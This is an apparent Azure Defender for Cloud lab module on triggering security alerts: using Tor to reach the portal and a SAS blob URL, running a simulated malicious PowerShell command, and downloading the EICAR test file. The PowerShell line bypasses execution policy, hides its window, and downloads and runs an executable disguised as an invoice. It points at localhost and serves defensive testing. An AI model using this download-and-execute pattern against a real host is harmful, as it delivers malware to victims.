# Module 13 - Trigger som security incidents

<p align="left"><img src="../Images/asc-labs-intermediate.gif?raw=true"></p>

#### 🎓 Level: 200 (Intermediate)
#### ⌛ Estimated time to complete this lab: 20 minutes


## Anonymous access to Azure resources

To simulate anonymous access we use the TOR browser to anonyminize your IP when accessing the azure portal or the service directly.
> ! NB: We don't recomend using the TOR browser in a production environment. 

TOR Browser download: [Download TOR Browser](https://www.torproject.org/download/)

### Login to the Azure Portal

1. start the TOR browser and access https://portal.azure.com
2. Log in to your lab environment
3. navigate to your Azure Subscription
4. navigate to your lab resource group
5. browse some of the different resources. I.e Key Vault, Storage Accounts

### Access a storage account content with TOR Browser
Creating Access Policy an URL for Storage account content:
1. In the Azure portal browse for **Storage accounts**
2. Locate the account part of the lab: **asclabxxxxxxx**
3. Browse the account an navigate to **Containers** in the sidebar
4. Click on one of the existing Containers, ie **azure-webjobs-hosts**
5. Brows the folder to you find a file. Or upload a file by your self.
6. Click on the file choosen
7. Click on **Genereate SAS** on the top tabs
8. Use deault settings and click on **Generate SAS token and URL**
9. Copy and keep the **Blob SAS URL**

Access the content from TOR Browser
1. Start the TOR browser
2. Paste the **Blob SAS URL** in the addressbar
   


## Simulate alerts on a Windows VM

### Simulate suspicious powershell command
1. Login to the target computer, asclab-win
    - Login information can be reset using the "reset password" functionality on the VM in the Azure portal.
2. Create a folder 'c:\test-MDATP-test'
3. Open a command-line window
4. At the prompt, copy and run the following command. The command prompt window will close automatically.
   ```
   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe'); Start-Process 'C:\\test-MDATP-test\\invoice.exe'
   ```
If the command is successful, you'll see a new alert on the workload protection dashboard and in the Microsoft Defender for Endpoint portal. This alert might take a few minutes to appear.
5. To review the alert in Defender for Cloud, go to **Security alerts > Suspicious Powershell commandline**



### Download Eicar
1. Login to the target computer, asclab-win
    - Login information can be reset using the "reset password" functionality on the VM in the Azure portal.
2. browse to: https://www.eicar.org/download-anti-malware-testfile/
3. Download one of the eicar files. ie eicar_com.zip



## Simulate alert for Azure Kubernetes Service






## More advanced scenarios
More advanced scenarios for simulating attack can be found here:
https://github.com/Azure/Microsoft-Defender-for-Cloud/tree/main/Simulations

